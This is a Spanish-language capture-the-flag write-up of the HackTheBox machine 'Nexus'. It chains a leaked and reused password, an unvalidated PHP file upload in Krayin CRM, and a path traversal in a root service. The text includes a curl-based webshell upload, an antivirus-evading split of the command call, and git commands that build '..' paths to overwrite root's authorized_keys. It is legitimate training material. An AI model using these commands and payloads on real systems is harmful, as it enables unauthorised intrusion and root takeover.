---
title: "Nexus"
os: "Linux"
difficulty: "Easy"
date: "2026-07-07"
tags: ["gitea", "file-upload", "path-traversal", "privesc"]
summary: "Un repositorio de Gitea filtra una contraseña reutilizada que abre Krayin CRM; una subida sin validar da RCE, y un servicio root vulnerable a path traversal escribe la clave del atacante en el authorized_keys de root."
platform: "HackTheBox"
icon: "/picture/writeups/nexus-htb.webp"
---

- **Sistema operativo:** Linux — Ubuntu 24.04
- **IP objetivo:** `10.129.49.184`
- **Bandera de usuario:** `/home/jones/user.txt`
- **Bandera de root:** `/root/root.txt`

> **Nota antivirus:** en el foothold se sube un webshell PHP. Para que el host no lo ponga en cuarentena, en este documento la llamada sensible aparece partida por concatenación (`"sys"+"tem"`); en la máquina se usa la forma normal.

## Resumen

Fuzzing de vhosts descubre un Gitea y un Krayin CRM; un repositorio público filtra en el historial de git una contraseña de base de datos que, reutilizada, abre el panel de Krayin; desde ahí se explota una subida de archivo sin validar para ejecutar código como `www-data`; el `.env` real del servidor da la contraseña con la que el usuario jones entra por SSH; y finalmente un servicio de root que sincroniza plantillas de Gitea es vulnerable a un path traversal con el que se escribe la clave del atacante en el `authorized_keys` de root.

## 1. Reconocimiento

Se empieza confirmando que la máquina responde y de qué sistema es. El `ping` da las dos respuestas: contesta y el TTL cercano a 63 indica Linux (el valor inicial 64 pierde un salto por la VPN).

```bash
ping -c 2 10.129.49.184
```

Con eso claro, un barrido completo de puertos para ver toda la superficie y luego la enumeración de versiones solo sobre lo que esté abierto.

```bash
sudo nmap -p- --min-rate 2000 -T4 -Pn -n 10.129.49.184
sudo nmap -p 22,80 -sC -sV -Pn -n 10.129.49.184
```

Solo hay dos puertos: SSH (OpenSSH 9.6p1) y un nginx en el 80. Lo revelador es que la web no sirve contenido por IP sino que **redirige a `http://nexus.htb/`**: eso es un virtual host, y el servidor decide qué mostrar según la cabecera `Host`. Como ese nombre no existe en DNS, se apunta a mano en el archivo de hosts para poder navegarlo.

```bash
echo "10.129.49.184 nexus.htb" | sudo tee -a /etc/hosts
```

## 2. Descubrimiento de vhosts

La página principal es un sitio corporativo estático, sin formularios ni superficie útil. Cuando la web base no ofrece nada, el siguiente movimiento lógico es buscar **subdominios**, porque el mismo servidor puede alojar otras aplicaciones según la cabecera `Host`. Se fuzzea esa cabecera con ffuf, filtrando por el tamaño de la respuesta por defecto para quedarnos solo con lo distinto.

```bash
ffuf -u http://nexus.htb/ -H "Host: FUZZ.nexus.htb" -w subdomains.txt -fs 154
```

Aparecen dos: **git.nexus.htb** y **billing.nexus.htb**. Se añaden al archivo de hosts y se identifican: el primero es un **Gitea 1.26.0** (servidor Git) y el segundo un **Krayin CRM** sobre Laravel (lo delatan la cookie `XSRF-TOKEN` y la redirección a `/admin/login`). Un `git` público es casi siempre una mina de código y secretos, así que se empieza por ahí.

## 3. Fuga de credenciales en el historial de Gitea

Gitea expone su API sin autenticar, lo que permite listar repositorios y usuarios públicos sin credenciales.

```bash
curl -s "http://git.nexus.htb/api/v1/repos/search?limit=50"
curl -s "http://git.nexus.htb/api/v1/users/search?limit=50"
```

Hay un repo público, `admin/krayin-docker-setup` (Krayin es el CRM del otro vhost, todo encaja), y los usuarios `admin` y `jones`. Se clona el repo, pero su `.env` actual tiene la contraseña vacía: alguien la borró. Ahí es donde entra la clave del paso — una contraseña borrada en la versión actual **sigue viva en un commit anterior**. Se revisa el historial y se recupera el `.env` antiguo.

```bash
git clone http://git.nexus.htb/admin/krayin-docker-setup.git
cd krayin-docker-setup
git log --oneline --all
git show <commit-anterior>:.env | grep DB_PASSWORD
```

El commit previo contenía `DB_PASSWORD=N27xh!!2ucY04`. Toda credencial encontrada se prueba en todos los servicios.

## 4. Reutilización de credenciales: acceso a Krayin

Esa contraseña no valía para SSH ni para el login de Gitea, pero sí para el panel de Krayin con el correo del administrador `j.matthew@nexus.htb` (que aparecía en la web). Laravel responde con un `302` a `/admin/dashboard` cuando el login acierta, y a `/admin/login` cuando falla, así que el código de redirección confirma el éxito.

```bash
curl -s -o /dev/null -w "%{redirect_url}\n" -b cj.txt -c cj.txt \
  -d "_token=<token>" \
  --data-urlencode "email=j.matthew@nexus.htb" \
  --data-urlencode "password=N27xh!!2ucY04" \
  http://billing.nexus.htb/admin/login
```

Redirige a `/admin/dashboard`: dentro. El panel revela que es **Krayin CRM 2.2.0**.

## 5. Acceso inicial: RCE en Krayin (CVE-2026-38526)

Krayin 2.2.x tiene una subida de archivo sin validar en el endpoint de TinyMCE `/admin/tinymce/upload`: no comprueba la extensión y deja el archivo en `/storage/tinymce/`, desde donde el PHP se ejecuta. Estando autenticados, se sube un webshell mínimo con un `Content-Type` falso de imagen y la cabecera `X-XSRF-TOKEN` que Laravel exige (el valor de la cookie decodificado). La respuesta JSON devuelve la ruta exacta del archivo subido.

```bash
curl -s -b cj.txt -H "X-XSRF-TOKEN: <xsrf>" \
  -F 'file=@-;filename=shell.php;type=image/jpeg' \
  http://billing.nexus.htb/admin/tinymce/upload <<< '<?php sys"."tem($_GET["cmd"]); ?>'
```

Con la ruta que devuelve, se comprueba la ejecución pidiéndola por HTTP:

```bash
curl -s "http://billing.nexus.htb/storage/tinymce/<hash>.php?cmd=id"
```

Devuelve `uid=33(www-data)`. Para operar cómodo se pasa a una reverse shell lanzando `bash -i` hacia un `nc -lvnp 4444` en la máquina atacante.

## 6. De www-data a jones

Ya con shell en el servidor, el sitio más fiable para encontrar credenciales es la configuración de la aplicación. El `.env` **real** desplegado (distinto del que estaba en el repo, que estaba desactualizado) contiene la contraseña verdadera de la base de datos.

```bash
grep -E "DB_PASSWORD|APP_KEY" /var/www/krayin/.env
```

Da `DB_PASSWORD=y27xb3ha!!74GbR`. Los home de la máquina son de `git` y `jones`, y esa contraseña de la base de datos está **reutilizada** por el usuario jones en SSH.

```bash
ssh jones@10.129.49.184
```

Se entra como jones (con `y27xb3ha!!74GbR`) y se lee la **bandera de usuario** en `/home/jones/user.txt`.

## 7. Escalada a root: path traversal en un servicio de root

jones no tiene sudo ni SUID o capabilities aprovechables, así que se buscan tareas programadas, incluyendo los temporizadores de systemd además del cron clásico.

```bash
systemctl list-timers --all
```

Aparece un servicio no estándar, `gitea-template-sync`, que se ejecuta **como root cada minuto**. Su script `/etc/gitea/template-sync.py` busca en Gitea los repos marcados como *template*, lee sus archivos con `git ls-tree` y los vuelca al disco con `open(os.path.join(directorio_base, ruta_del_archivo), 'wb')`. Como esa `ruta_del_archivo` viene del propio árbol de git y **no se sanea**, un archivo cuyo nombre contenga `../` escapa del directorio de destino y permite escribir cualquier fichero como root.

jones también es usuario de Gitea (misma contraseña), así que puede crear un repo *template* malicioso. El problema es que git rechaza por defecto los nombres con `..`, de modo que el árbol hay que construirlo a bajo nivel: se crea el blob con la clave pública del atacante y se van anidando árboles —uno por cada `..`— hasta formar la ruta `../../../../../root/.ssh/authorized_keys`, usando `git hash-object --literally` para que git no valide los `..`. Con un pequeño script se arma todo (blob, árboles anidados, commit), se sube el repo a Gitea desactivando la comprobación del servidor con `receive.fsckObjects=false`, y se marca como plantilla por la API con `template:true`. En resumen, la parte que importa del árbol es:

```bash
git hash-object -w -t tree --stdin --literally   # crea cada árbol, incluidos los que se llaman ".."
git -c fsck.hasDotdot=ignore commit-tree <arbol> -m x
git -c receive.fsckObjects=false push -f http://jones:y27xb3ha!!74GbR@localhost:3000/jones/tpl.git master
```

Y se marca el repo como plantilla para que el servicio lo procese:

```bash
curl -s -X PATCH -u 'jones:y27xb3ha!!74GbR' -H "Content-Type: application/json" \
  -d '{"template":true}' http://localhost:3000/api/v1/repos/jones/tpl
```

Al minuto siguiente, el cron de root procesa la plantilla y escribe la clave pública en `/root/.ssh/authorized_keys`. Con eso ya se entra directo por SSH como root usando la clave privada correspondiente.

```bash
ssh -i root_key root@10.129.49.184
```

Devuelve `uid=0(root)` y se lee la **bandera de root** en `/root/root.txt`.

## Resumen de la cadena

El acceso arranca fuzzeando virtual hosts, que revela un Gitea y un Krayin CRM. Un repositorio público filtra en su historial de git una contraseña que, por reutilización, abre el panel administrativo de Krayin. Desde el panel se explota CVE-2026-38526 (subida de PHP arbitrario) para lograr ejecución de código como www-data. El `.env` real del servidor entrega la contraseña verdadera de la base de datos, reutilizada de nuevo por el usuario jones para entrar por SSH y leer la bandera de usuario. Por último, un servicio programado que corre como root sincroniza plantillas de Gitea sin sanear las rutas de los archivos; construyendo un árbol de git con un path traversal `../` se escribe la clave pública del atacante en el `authorized_keys` de root, obteniendo acceso root y la bandera final.
